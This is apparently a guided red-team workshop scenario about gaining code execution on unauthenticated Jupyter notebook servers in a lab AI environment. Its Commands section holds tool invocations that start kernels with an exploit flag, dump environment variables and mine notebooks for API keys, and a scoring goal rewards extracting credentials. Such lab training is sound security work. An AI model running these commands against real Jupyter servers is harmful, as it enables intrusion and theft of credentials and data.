# Scenario 05: Jupyter Remote Code Execution

> ★ **Shown at DEF CON RTV** - part of the guided demo/workshop. [All scenarios](index.md)

**Difficulty:** Intermediate
**Time:** ~20 minutes
**Prerequisites:** Complete [Scenario 01](scenario-01.md)
**Target:** ailab-dev:8888 (Jupyter), ailab-ds:8889 (Jupyter)

## Background

Jupyter notebooks are the standard interactive computing environment for data scientists and ML engineers. When deployed with default settings, they often use pre-configured tokens or no authentication at all. A compromised Jupyter instance gives an attacker arbitrary code execution in the context of the data science environment - access to datasets, model files, environment variables, and network access to other internal services.

## Objective

Gain code execution through Jupyter notebooks and extract environment variables, credentials, and accessible resources.

## Commands

```bash
# 1. Get a kernel to run code in. List any existing kernels, or start a fresh one
#    (exec runs in an EXISTING kernel, so you need its id first):
aipostex jupyter --target 172.16.50.10:8888 kernels
aipostex jupyter --target 172.16.50.10:8888 start-kernel --force-exploit   # note the returned kernel id

# 2. Execute in that kernel — exec REQUIRES --kernel <id>:
aipostex jupyter --target 172.16.50.10:8888 exec --kernel <id> --code "import os; print(os.environ)" --force-exploit

# Same pattern on the data science host (ds Jupyter listens on :8889):
aipostex jupyter --target 172.16.50.30:8889 start-kernel --force-exploit   # note the returned kernel id
aipostex jupyter --target 172.16.50.30:8889 exec --kernel <id> --code "import os; print(os.environ)" --force-exploit

# No kernel needed for pure secret-mining (read-confirmed):
aipostex jupyter --target 172.16.50.10:8888 notebooks --mine-secrets
```

## Expected Finding

**Jupyter (ailab-dev:8888):**
- Token-less or weak-token access to notebook server
- Environment variables containing API keys, database connection strings
- Notebook contents with hardcoded credentials
- File system access to local model files and scripts

**Jupyter (ailab-ds:8889):**
- Similar findings with data-science-specific credentials
- Access to dataset files and model training artifacts
- Network access to vector databases (Qdrant, Weaviate) on the same host

Example finding:
```json
{
  "finding_type": "credential",
  "service": "jupyter",
  "detail": "Environment variable leak",
  "key": "OPENAI_API_KEY",
  "value": "sk-..."
}
```

**Scoring objective:** Extract at least 2 environment variables containing API keys from each Jupyter instance.

## Real-World Impact

Jupyter is often the weakest link in AI infrastructure. Data scientists prioritize convenience over security - notebooks run with elevated permissions, environment variables contain production API keys, and the file system has access to training data. A single compromised Jupyter instance can pivot to every other service the data scientist had access to.

## Follow-On

- [Scenario 06](scenario-06.md): Use Jupyter access to reach MLflow, Ray, and W&B
- [Scenario 11](scenario-11.md): Explore MCP tools accessible from ailab-dev
